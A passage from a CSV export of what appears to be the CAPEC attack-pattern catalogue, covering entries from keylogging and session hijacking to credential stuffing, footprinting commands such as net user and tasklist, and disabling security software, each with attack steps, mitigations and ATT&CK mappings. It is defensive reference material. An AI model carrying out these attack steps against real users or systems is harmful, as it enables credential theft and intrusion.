user's credentials to capture] Since this is a more targeted attack, an adversary will first identify a particular user they wish the capture the credentials of.::STEP:2:PHASE:Experiment:DESCRIPTION:[Deploy keylogger] Once a user is identified, an adversary will deploy a keylogger to the user's system in one of many ways.:TECHNIQUE:Send a phishing email with a malicious attachment that installs a keylogger on a user's system:TECHNIQUE:Conceal a keylogger behind fake software and get the user to download the software:TECHNIQUE:Get a user to click on a malicious URL that directs them to a webpage that will install a keylogger without their knowledge:TECHNIQUE:Gain access to the user's system through a vulnerability and manually install a keylogger::STEP:3:PHASE:Experiment:DESCRIPTION:[Record keystrokes] Once the keylogger is deployed on the user's system, the adversary will record keystrokes over a period of time.::STEP:4:PHASE:Experiment:DESCRIPTION:[Analyze data and determine credentials] Using the captured keystrokes, the adversary will be able to determine the credentials of the user.:TECHNIQUE:Search for repeated sequences that are following by the enter key:TECHNIQUE:Search for repeated sequences that are not found in a dictionary:TECHNIQUE:Search for several backspaces in a row. This could indicate a mistyped password. The correct password can then be inferred using the whole key sequence::STEP:5:PHASE:Exploit:DESCRIPTION:[Use found credentials] After the adversary has found the credentials for the target user, they will then use them to gain access to a system in order to perform some follow-up attack::\",\"::The ability to install the keylogger, either in person or remote.::\",\"\",\"\",\"\",\"\",\"::Strong physical security can help reduce the ability of an adversary to install a keylogger.::\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056.001:ENTRY NAME:Input Capture:Keylogging::\",\"\",\n569,\"Collect Data as Provided by Users\",Standard,Draft,\"An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1056:ENTRY NAME:Input Capture::\",\"\",\n57,\"Utilizing REST's Trust in the System Resource to Obtain Sensitive Data\",Detailed,Draft,\"This attack utilizes a REST(REpresentational State Transfer)-style applications' trust in the system resources and environment to obtain sensitive data once SSL is terminated.\",\"\",Medium,Very High,\"::NATURE:ChildOf:CAPEC ID:157::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find a REST-style application that uses SSL] The adversary must first find a REST-style application that uses SSL to target. Because this attack is easier to carry out from inside of a server network, it is likely that an adversary could have inside knowledge of how services operate.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert a listener to sniff client-server communication] The adversary inserts a listener that must exist beyond the point where SSL is terminated. This can be placed on the client side if it is believed that sensitive information is being sent to the client as a response, although most often the listener will be placed on the server side to listen for client authentication information.:TECHNIQUE:Run wireshark or tcpdump on a device that is on the inside of a firewall, load balancer, or router of a network and capture traffic after SSL has been terminated::STEP:3:PHASE:Exploit:DESCRIPTION:[Gather information passed in the clear] If developers have not hashed or encrypted data sent in the sniffed request, the adversary will be able to read this data in the clear. Most commonly, they will now have a username or password that they can use to submit requests to the web service just as an authorized user::\",\"::Opportunity to intercept must exist beyond the point where SSL is terminated.::The adversary must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.::\",\"::SKILL:To insert a network sniffer or other listener into the communication stream:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Implementation: Implement message level security such as HMAC in the HTTP communication::Design: Utilize defense in depth, do not rely on a single security mechanism like SSL::Design: Enforce principle of least privilege::\",\"::The Rest service provider uses SSL to protect the communications between the service requester (client) to the service provider. In the instance where SSL is terminated before the communications reach the web server, it is very common in enterprise data centers to terminate SSL at a router, firewall, load balancer, proxy or other device, then the adversary can insert a sniffer into the communication stream and gather all the authentication tokens (such as session credentials, username/passwords combinations, and so on). The Rest service requester and service provider do not have any way to detect this attack.::\",\"::300::287::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1040:ENTRY NAME:Network Sniffing::\",\"\",\n571,\"Block Logging to Central Repository\",Standard,Draft,\"An adversary prevents host-generated logs being delivered to a central location in an attempt to hide indicators of compromise.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Impair Command History Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.006:ENTRY NAME:Impair Defenses: Indicator Blocking::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::\",\"\",\n572,\"Artificially Inflate File Sizes\",Standard,Draft,\"An adversary modifies file contents by adding data to files for several reasons. Many different attacks could “follow” this pattern resulting in numerous outcomes. Adding data to a file could also result in a Denial of Service condition for devices with limited storage capacity.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"\",\"::An adversary could potentially increase file sizes on devices containing limited storage resources, such as SCADA or IOT devices, resulting in denial of service conditions.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.001:ENTRY NAME:Obfuscated Files or Information:Binary Padding::\",\"\",\n573,\"Process Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the currently running processes on the target system to an authorized user. By knowing what processes are running on the target system, the adversary can learn about the target environment as a means towards further malicious behavior.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"::On a Windows system, the command, tasklist, displays information about processes. The same function on a Mac OS system is done with the command, ps.::In addition to manual discovery of running processes, an adversary can develop malware that carries out this attack pattern before subsequent malicious action.::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1057:ENTRY NAME:Process Discovery::\",\"\",\n574,\"Services Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the services on the target system to an authorized user. By knowing what services are registered on the target system, the adversary can learn about the target environment as a means towards further malicious behavior. Depending on the operating system, commands that can obtain services information include sc and tasklist/svc using Tasklist, and net start using Net.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by uaing a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1007:ENTRY NAME:System Service Discovery::\",\"\",\n575,\"Account Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about the domain accounts and their permissions on the target system to an authorized user. By knowing what accounts are registered on the target system, the adversary can inform further and more targeted malicious behavior. Example Windows commands which can acquire this information are: net user and dsquery.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs that may be used to acquire account information and block them by using a software restriction policy or tools that restrict program execution by uysing a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1087:ENTRY NAME:Account Discovery::\",\"\",\n576,\"Group Permission Footprinting\",Standard,Stable,\"An adversary exploits functionality meant to identify information about user groups and their permissions on the target system to an authorized user. By knowing what users/permissions are registered on the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command which can list local groups is net localgroup.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Identify programs (such as net) that may be used to enumerate local group permissions and block them by using a software restriction Policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1069:ENTRY NAME:Permission Groups Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1615:ENTRY NAME:Group Policy Discovery::\",\"\",\n577,\"Owner Footprinting\",Standard,Draft,\"An adversary exploits functionality meant to identify information about the primary users on the target system to an authorized user. They may do this, for example, by reviewing logins or file modification times. By knowing what owners use the target system, the adversary can inform further and more targeted malicious behavior. An example Windows command that may accomplish this is dir /A ntuser.dat. Which will display the last modified time of a user's ntuser.dat file when run within the root folder of a user. This time is synonymous with the last time that user was logged in.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.::Administrator permissions are required to view the home folder of other users.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"::Ensure that proper permissions on files and folders are enacted to limit accessibility.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1033:ENTRY NAME:System Owner/User Discovery::\",\"\",\n578,\"Disable Security Software\",Standard,Usable,\"An adversary exploits a weakness in access control to disable security tools so that detection does not occur. This can take the form of killing processes, deleting registry keys so that tools do not start at run time, deleting log files, or other methods.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:176::\",\"\",\"::The adversary must have the capability to interact with the configuration of the targeted system.::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Hide Activities:NOTE:By disabling certain security tools, the adversary can hide malicious activity and avoid detection.::\",\"::Ensure proper permissions are in place to prevent adversaries from altering the execution status of security tools.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1556.006:ENTRY NAME:Modify Authentication Process: Multi-Factor Authentication::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.001:ENTRY NAME:Impair Defenses: Disable or Modify Tools::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.002:ENTRY NAME:Impair Defenses: Disable Windows Event Logging::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.004:ENTRY NAME:Impair Defenses: Disable or Modify System Firewall::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.007:ENTRY NAME:Impair Defenses: Disable or Modify Cloud Firewall::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.008:ENTRY NAME:Impair Defenses: Disable Cloud Logs::::TAXONOMY NAME:ATTACK:ENTRY ID:1562.009:ENTRY NAME:Impair Defenses: Safe Mode Boot::\",\"\",\n579,\"Replace Winlogon Helper DLL\",Detailed,Draft,\"Winlogon is a part of Windows that performs logon actions. In Windows systems prior to Windows Vista, a registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Changes to registry entries in HKLMSoftwareMicrosoftWindows NTWinlogonNotify that do not correlate with known software, patch cycles, etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious.::\",\"\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1547.004:ENTRY NAME:Boot or Logon Autostart Execution: Winlogon helper DLL::\",\"\",\n580,\"System Footprinting\",Standard,Stable,\"An adversary engages in active probing and exploration activities to determine security information about a remote target system. Often times adversaries will rely on remote applications that can be probed for system configurations.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must have logical access to the target network and system.::\",\"::SKILL:The adversary needs to know basic linux commands.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Keep patches up to date by installing weekly or daily if possible.::Identify programs that may be used to acquire peripheral information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"::204::205::208::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1082:ENTRY NAME:System Information Discovery::\",\"\",\n581,\"Security Software Footprinting\",Detailed,Draft,\"Adversaries may attempt to get a listing of security tools that are installed on the system and their configurations. This may include security related system features (such as a built-in firewall or anti-spyware) as well as third-party security software.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:580::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Identify programs that may be used to acquire security tool information and block them by using a software restriction policy or tools that restrict program execution by using a process allowlist.::\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1518.001:ENTRY NAME:Software Discovery:Security Software Discovery::\",\"\",\n593,\"Session Hijacking\",Standard,Stable,\"This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The adversary is able to steal or manipulate an active session and use it to gain unathorized access to the application.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:21::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Discover Existing Session Token] Through varrying means, an adversary will discover and store an existing session token for some other authenticated user session.::STEP:2:PHASE:Experiment:DESCRIPTION:[Insert Found Session Token] The attacker attempts to insert a found session token into communication with the targeted application to confirm viability for exploitation.::STEP:3:PHASE:Exploit:DESCRIPTION:[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.::\",\"::An application that leverages sessions to perform authentication.::\",\"::SKILL:Exploiting a poorly protected identity token is a well understood attack with many helpful resources available.:LEVEL:Low::\",\"::The adversary must have the ability to communicate with the application over the network.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Gain Privileges:NOTE:A successful attack can enable an adversary to gain unauthorized access to an application.::\",\"::Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.::\",\"\",\"::287::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1185:ENTRY NAME:Browser Session Hijacking::::TAXONOMY NAME:ATTACK:ENTRY ID:1550.001:ENTRY NAME:Use Alternate Authentication Material:Application Access Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1563:ENTRY NAME:Remote Service Session Hijacking::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Session hijacking attack::\",\"\",\n60,\"Reusing Session IDs (aka Session Replay)\",Detailed,Draft,\"This attack targets the reuse of valid session ID to spoof the target system in order to gain privileges. The attacker tries to reuse a stolen session ID used previously during a transaction to perform spoofing and session hijacking. Another name for this type of attack is Session Replay.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:593::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The attacker interacts with the target host and finds that session IDs are used to authenticate users.::STEP:2:PHASE:Explore:DESCRIPTION:The attacker steals a session ID from a valid user.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker tries to use the stolen session ID to gain access to the system with the privileges of the session ID's original owner.::\",\"::The target host uses session IDs to keep track of the users.::Session IDs are used to control access to resources.::The session IDs used by the target host are not well protected from session theft.::\",\"::SKILL:If an attacker can steal a valid session ID, they can then try to be authenticated with that stolen session ID.:LEVEL:Low::SKILL:More sophisticated attack can be used to hijack a valid session from a user and spoof a legitimate user by reusing their valid session ID.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Always invalidate a session ID after the user logout.::Setup a session time out for the session IDs.::Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate adversary in the middle attacks (CAPEC-94).::Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.::Encrypt the session data associated with the session ID.::Use multifactor authentication.::\",\"::OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428::Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user's answer or forward URLs. See also: CVE-2002-0258::\",\"::294::290::346::384::488::539::200::285::664::732::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134.001:ENTRY NAME:Access Token Manipulation:Token Impersonation/Theft::::TAXONOMY NAME:ATTACK:ENTRY ID:1550.004:ENTRY NAME:Use Alternate Authentication Material:Web Session Cookie::\",\"\",\n600,\"Credential Stuffing\",Standard,Stable,\"An adversary tries known username/password combinations against different systems, applications, or services to gain additional authenticated access. Credential Stuffing attacks rely upon the fact that many users leverage the same username/password combination for multiple systems, applications, and services.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.:TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each username/password combination until the target grants access.:TECHNIQUE:Manually or automatically enter each username/password combination through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system or to laterally move within a system or application::STEP:4:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:5:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::\",\"::SKILL:A Credential Stuffing attack is very straightforward.:LEVEL:Low::\",\"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::A known list of username/password combinations.::A custom script that leverages the credential list to launch the attack.::\",\"::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::\",\"::A user leverages the password Password123 for a handful of application logins. An adversary obtains a victim's username/password combination from a breach of a social media application and executes a Credential Stuffing attack against multiple banking and credit card applications. Since the user leverages the same credentials for their bank account login, the adversary successfully authenticates to the user's bank account and transfer money to an offshore account.::In October 2014 J.P. Morgan's Corporate Challenge website was breached, resulting in adversaries obtaining multiple username/password pairs. A Credential Stuffing attack was then executed against J.P. Morgan Chase, which resulted in over 76 million households having their accounts compromised.::\",\"::522::307::308::309::262::263::654::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.004:ENTRY NAME:Brute Force:Credential Stuffing::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Credential stuffing::\",\"\",\n609,\"Cellular Traffic Intercept\",Detailed,Draft,\"Cellular traffic for voice and data from mobile devices and retransmission devices can be intercepted via numerous methods. Malicious actors can deploy their own cellular tower equipment and intercept cellular traffic surreptitiously. Additionally, government agencies of adversaries and malicious actors can intercept cellular traffic via the telecommunications backbone over which mobile traffic is transmitted.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:157::\",\"\",\"::None::\",\"::SKILL:Adversaries can purchase hardware and software solutions, or create their own solutions, to capture/intercept cellular radio traffic. The cost of a basic Base Transceiver Station (BTS) to broadcast to local mobile cellular radios in mobile devices has dropped to very affordable costs. The ability of commercial cellular providers to monitor for rogue BTS stations is poor in many areas and it is assumed that rogue BTS stations exist in urban areas.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Capture all cellular and RF traffic from mobile and retransmission devices. Move bulk traffic capture to storage area for cryptanalysis of encrypted traffic, and telemetry analysis of non-encrypted data. (packet headers, cellular power data, signal strength, etc.)::\",\"::Encryption of all data packets emanating from the smartphone to a retransmission device via two encrypted tunnels with Suite B cryptography, all the way to the VPN gateway at the datacenter.::\",\"\",\"::311::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1111:ENTRY NAME:Multi-Factor Authentication Interception::\",\"\",\n616,\"Establish Rogue Location\",Standard,Stable,\"An adversary provides a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. After establishing the rogue location, the adversary waits for a victim to visit the location and access the malicious resource.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:154::NATURE:CanPrecede:CAPEC ID:691::\",\"\",\"::A resource is expected to available to the user.::\",\"::SKILL:Adversaries can often purchase low-cost technology to implement rogue access points.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:TECHNICAL IMPACT:Other:NOTE:Successful attacks of this nature can result in a wide variety of consequences and negatively impact confidentiality and integrity based on the adversary's subsequent actions.::\",\"\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.005:ENTRY NAME:Masquerading: Match Legitimate Name or Location::\",\"\",\n620,\"Drop Encryption Level\",Standard,Draft,\"An attacker forces the encryption level to be lowered, thus enabling a successful attack against the encrypted data.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:212::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::757::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1600:ENTRY NAME:Weaken Encryption::\",\"\",\n633,\"Token Impersonation\",Detailed,Stable,\"An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:194::\",\"\",\"::This pattern of attack is only applicable when a downstream user leverages tokens to verify identity, and then takes action based on that identity.::\",\"\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic:NOTE:By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:Integrity:TECHNICAL IMPACT:Gain Privileges:NOTE:By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.::SCOPE:Integrity:TECHNICAL IMPACT:Hide Activities:NOTE:Faking the source of data or services can be used to create a false trail in logs as the target will associated any actions with the impersonated identity instead of the adversary.::\",\"\",\"\",\"::287::1270::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134:ENTRY NAME:Access Token Manipulation::\",\"\",\n634,\"Probe Audio and Video Peripherals\",Detailed,Stable,\"The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:651::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::Knowledge of the target device's or application’s vulnerabilities that can be capitalized on with malicious code. The adversary must be able to place the malicious code on the target device.::\",\"::SKILL:To deploy a hidden process or malware on the system to automatically collect audio and video data.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Prevent unknown code from executing on a system through the use of an allowlist policy.::Patch installed applications as soon as new updates become available.::\",\"::An adversary can capture audio and video, and transmit the recordings to a C2 server or a similar capability.::An adversary can capture and record from audio peripherals in a vehicle via a Car Whisperer attack. If an adversary is within close proximity to a vehicle with Bluetooth capabilities, they may attempt to connect to the hands-free system when it is in pairing mode. With successful authentication, if an authentication system is present at all, an adversary may be able to play music/voice recordings, as well begin a recording and capture conversations happening inside the vehicle. Successful authentication relies on the pairing security key being set to a default value, or by brute force (which may be less practical in an outside environment) Depending on the sensitivity of the information being discussed, this scenario can be extremely compromising.::An adversary may also use a technique called Bluebugging, which is similar to Bluesnarfing but requires the adversary to be between 10-15 meters of the target device. Bluebugging creates a backdoor for an attacker to listen/record phone calls, forward calls, send SMS and retrieve the phonebook.::\",\"::267::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1123:ENTRY NAME:Audio Capture::::TAXONOMY NAME:ATTACK:ENTRY ID:1125:ENTRY NAME:Video Capture::\",\"\",\n635,\"Alternative Execution Due to Deceptive Filenames\",Standard,Draft,\"The extension of a file name is often used in various contexts to determine the application that is used to open and use it. If an attacker can cause an alternative application to be used, it may be able to execute malicious code, cause a denial of service or expose sensitive information.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"::The use of the file must be controlled by the file extension.::\",\"\",\"\",\"\",\"\",\"::Applications should insure that the content of the file is consistent with format it is expecting, and not depend solely on the file extension.::\",\"\",\"::162::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.007:ENTRY NAME:Masquerading: Double File Extension::\",\"\",\n636,\"Hiding Malicious Data or Code within Files\",Standard,Draft,\"Files on various operating systems can have a complex format which allows for the storage of other data, in addition to its contents. Often this is metadata about the file, such as a cached thumbnail for an image file. Unless utilities are invoked in a particular way, this data is not visible during the normal use of the file. It is possible for an attacker to store malicious data or code using these facilities, which would be difficult to discover.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:165::\",\"\",\"::The operating system must support a file system that allows for alternate data storage for a file.::\",\"\",\"\",\"\",\"\",\"::Many tools are available to search for the hidden data. Scan regularly for such data using one of these tools.::\",\"\",\"::506::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1001.002:ENTRY NAME:Data Obfuscation: Steganography::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.003:ENTRY NAME:Obfuscated Files or Information: Steganography::::TAXONOMY NAME:ATTACK:ENTRY ID:1027.004:ENTRY NAME:Obfuscated Files or Information: Compile After Delivery::::TAXONOMY NAME:ATTACK:ENTRY ID:1218.001:ENTRY NAME:Signed Binary Proxy Execution: Compiled HTML File::::TAXONOMY NAME:ATTACK:ENTRY ID:1221:ENTRY NAME:Template Injection::\",\"\",\n637,\"Collect Data from Clipboard\",Detailed,Stable,\"The adversary exploits an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. Data copied to the clipboard can be accessed by other applications, such as malware built to exfiltrate or log clipboard contents on a periodic basis. In this way, the adversary aims to garner information to which they are unauthorized.\",\"\",Low,Low,\"::NATURE:ChildOf:CAPEC ID:150::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find an application that allows copying sensititve data to clipboad] An adversary first needs to find an application that allows copying and pasting of sensitive information. This could be an application that prints out temporary passwords to the screen, private email addresses, or any other sensitive information or data::STEP:2:PHASE:Experiment:DESCRIPTION:[Target users of the application] An adversary will target users of the application in order to obtain the information in their clipboard on a periodic basic:TECHNIQUE:Install malware on a user's system designed to log clipboard contents periodically:TECHNIQUE:Get the user to click on a malicious link that will bring them to an application to log the contents of the 